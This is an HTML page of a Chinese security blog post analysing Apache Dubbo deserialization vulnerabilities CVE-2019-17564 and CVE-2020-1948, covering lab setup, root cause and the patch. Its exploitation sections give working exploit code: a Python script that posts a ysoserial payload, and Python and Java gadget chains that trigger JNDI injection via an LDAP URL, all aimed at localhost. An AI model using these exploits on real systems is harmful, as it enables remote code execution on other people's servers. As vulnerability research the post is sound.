@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Dubbo反序列化漏洞 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 七月 9日 2020, 10:40 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      11 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 最近看到的 Dubbo 反序列化漏洞，以前没有见过这个框架，现在顺便总结一下最近的几个反序列化洞。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h3><p>Dubbo 是一个分布式服务框架远程调用框架，类似 Java 的 RMI 远程方法调用，需要进行跨 JVM 的远程网络通信，所以就要用到序列化和反序列化。而 Dubbo 中有多种序列化方式，有的序列化方式在反序列化收到的数据的时候，就容易受到反序列化攻击。</p>
+<h3 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE-2019-17564"></a>CVE-2019-17564</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>在 <a href="https://github.com/apache/dubbo-samples">GitHub</a> 上面拖一个 demo，然后 IDEA 打开使用 HTTP 协议的 dubbo-samples-http 文件夹，修改一下 pom.xml 里面的 Dubbo 版本，再加入一个可以利用的 Gadget：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo.version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">dubbo.version</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再修改一下 http-provider.xml 里面的 zookeeper 地址，这里我将 zookeeper 开在虚拟机的 docker 里面，所以这里是虚拟机地址：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://$&#123;zookeeper.address:192.168.111.128&#125;:2181&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在虚拟机开一个 zookeeper 容器：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull zookeeper</span><br><span class="line">docker run -id --name zookeeper -p 2181:2181 zookeeper</span><br></pre></td></tr></table></figure>
+
+<p>然后 Dubbo 的 HttpProvider 就可以开起来了。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>根据漏洞描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unsafe deserialization occurs within a Dubbo application which has HTTPremoting enabled. An attacker may submit a POST request with a Java object init to completely compromise a Provider instance of Apache Dubbo, if thisinstance enables HTTP.</span><br></pre></td></tr></table></figure>
+
+<p>简单发一个 POST 请求，可以看到错误的调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.io.StreamCorruptedException: invalid stream header: 64617461</span><br><span class="line">java.io.ObjectInputStream.readStreamHeader(ObjectInputStream.java:899)</span><br><span class="line">java.io.ObjectInputStream.&lt;init&gt;(ObjectInputStream.java:357)</span><br><span class="line">org.springframework.core.ConfigurableObjectInputStream.&lt;init&gt;(ConfigurableObjectInputStream.java:63)</span><br><span class="line">org.springframework.remoting.rmi.CodebaseAwareObjectInputStream.&lt;init&gt;(CodebaseAwareObjectInputStream.java:97)</span><br><span class="line">org.springframework.remoting.rmi.RemoteInvocationSerializingExporter.createObjectInputStream(RemoteInvocationSerializingExporter.java:125)</span><br><span class="line">org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.readRemoteInvocation(HttpInvokerServiceExporter.java:119)</span><br><span class="line">org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.readRemoteInvocation(HttpInvokerServiceExporter.java:100)</span><br><span class="line">org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.handleRequest(HttpInvokerServiceExporter.java:79)</span><br><span class="line">org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler.handle(HttpProtocol.java:216)</span><br><span class="line">org.apache.dubbo.remoting.http.servlet.DispatcherServlet.service(DispatcherServlet.java:61)</span><br><span class="line">javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span><br></pre></td></tr></table></figure>
+
+<p>因为输入的不是 Java 序列化字节码，所以会因为无法反序列化而报错，追踪调用栈，我们定位到 HttpInvokerServiceExporter 类的 readRemoteInvocation 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> createObjectInputStream(decorateInputStream(request, is));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	<span class="keyword">return</span> doReadRemoteInvocation(ois);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">    	ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到从输入中创建一个 ObjectInputStream 对象，然后在 doReadRemoteInvocation 方法中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Deserialized object needs to be assignable to type [&quot;</span> +</span><br><span class="line">        	RemoteInvocation.class.getName() + <span class="string">&quot;]: &quot;</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (RemoteInvocation) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行了反序列化。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>很简单，POST 一个 ysoserial 生成的 payload 就好了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot; http://127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService&quot;</span></span><br><span class="line">data = base64.b64decode(<span class="string">&quot;rO...Hg=&quot;</span>)</span><br><span class="line">requests.post(url, data=data)</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h3><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>在 <a href="https://github.com/apache/dubbo-spring-boot-project">GItHub</a> 上面拖一个 Dubbo 2.7.6 版本的 demo，然后用 IDEA 打开 dubbo-spring-boot-samples 文件夹，运行 DubboAutoConfigurationProviderBootstrap 类，就可以把环境开起来了。</p>
+<p>然后给这个项目里的 pom.xml，即 dubbo-spring-boot-samples\auto-configure-samples\provider-sample\pom.xml 加上 rome 依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>这个漏洞有两个触发点，第一个没什么好说的，就是普通的 Hessian 反序列化攻击（就是 Dubbo 默认使用的序列化方式），Dubbo 会反序列化传输来的方法参数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">args = <span class="keyword">new</span> <span class="title class_">Object</span>[pts.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	args[i] = in.readObject(pts[i]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">        	log.warn(<span class="string">&quot;Decode argument failed: &quot;</span> + e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另一个触发点比较有意思，利用的是打印错误信息触发的 toString，Dubbo 在找不到注册的 service 就会打印错误信息：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DubboExporter&lt;?&gt; exporter = (DubboExporter&lt;?&gt;) exporterMap.get(serviceKey);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (exporter == <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingException</span>(channel, <span class="string">&quot;Not found exported service: &quot;</span> + serviceKey + <span class="string">&quot; in &quot;</span> + exporterMap.keySet() + <span class="string">&quot;, may be version or group mismatch &quot;</span> + <span class="string">&quot;, channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress() + <span class="string">&quot;, message:&quot;</span> + inv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 inv 就是 DecodeableRpcInvocation 类型的对象，里面存放了远程方法调用需要的数据，比如反序列化后的 arguments，这里会隐式调用它的 toString 方法，也就是它的父类 RpcInvocation 的 toString 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;RpcInvocation [methodName=&quot;</span> + methodName + <span class="string">&quot;, parameterTypes=&quot;</span></span><br><span class="line">        + Arrays.toString(parameterTypes) + <span class="string">&quot;, arguments=&quot;</span> + Arrays.toString(arguments)</span><br><span class="line">        + <span class="string">&quot;, attachments=&quot;</span> + attachments + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说会调用 arguments 对象的 toString，就可以作为反序列化链的入口，比如接上 Rome 依赖中的 toStringBean 触发 JNDI 注入。</p>
+<p>顺带一提的是，在高一点版本的 Dubbo（2.7.6）中，这个入口点已经被修复了，打印错误的代码变成了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DubboExporter&lt;?&gt; exporter = (DubboExporter&lt;?&gt;) exporterMap.get(serviceKey);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (exporter == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingException</span>(channel, <span class="string">&quot;Not found exported service: &quot;</span> + serviceKey + <span class="string">&quot; in &quot;</span> + exporterMap.keySet() + <span class="string">&quot;, may be version or group mismatch &quot;</span> + <span class="string">&quot;, channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress() + <span class="string">&quot;, message:&quot;</span> + getInvocationWithoutData(inv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有直接调用 inv 的 toString 方法，而是调用 getInvocationWithoutData 方法来获取数据：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Invocation <span class="title function_">getInvocationWithoutData</span><span class="params">(Invocation invocation)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">    	<span class="keyword">return</span> invocation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (invocation <span class="keyword">instanceof</span> RpcInvocation) &#123;</span><br><span class="line">        <span class="type">RpcInvocation</span> <span class="variable">rpcInvocation</span> <span class="operator">=</span> (RpcInvocation) invocation;</span><br><span class="line">        rpcInvocation.setArguments(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> rpcInvocation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> invocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把 arguments 置空了，这个入口点也就无法使用了，除非配置了 debug 模式。</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>第二种利用方式可以直接使用 python 的 dubbo-py 库，参考 ruilin 师傅给出的 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl = new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">)</span><br><span class="line">JdbcRowSetImplClass = new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">)</span><br><span class="line">toStringBean = new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;cn.rui0&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    service_version=<span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">    args=[toStringBean]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>第一种的利用就比较麻烦了，因为 Rome 的 HashMap 类型要用 dubbo-py 来构造比较复杂，利用方式跟 Java RMI 客户端攻击服务端相似，不过不需要在意服务函数的参数类型，因为它的函数调用是在反序列化完成之后进行的。</p>
+<p>所以利用的时候可以像参考文章里面那样，通过 wireshark 抓包改包来完成，也可以自己改一改它的接口（将方法参数类型改为 Object）和消费者类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboAutoConfigurationConsumerBootstrap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference(version = &quot;1.0.0&quot;, url = &quot;dubbo://127.0.0.1:12345&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> DemoService demoService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;replacement&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">        Object[] hashMapTable = (Object[])getFieldValue(hashMap, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hashMapNode</span> <span class="operator">=</span> hashMapTable[<span class="number">1</span>];</span><br><span class="line">        setFieldValue(hashMapNode, <span class="string">&quot;key&quot;</span>, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DubboAutoConfigurationConsumerBootstrap.class).close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ApplicationRunner <span class="title function_">runner</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> demoService.sayHello(getPoc());</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        <span class="keyword">return</span> args -&gt; logger.info(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一发入魂。</p>
+<h3 id="2-7-7-反序列化漏洞绕过"><a href="#2-7-7-反序列化漏洞绕过" class="headerlink" title="2.7.7 反序列化漏洞绕过"></a>2.7.7 反序列化漏洞绕过</h3><p>2.7.7 在反序列化参数的时候加多了一个验证：</p>
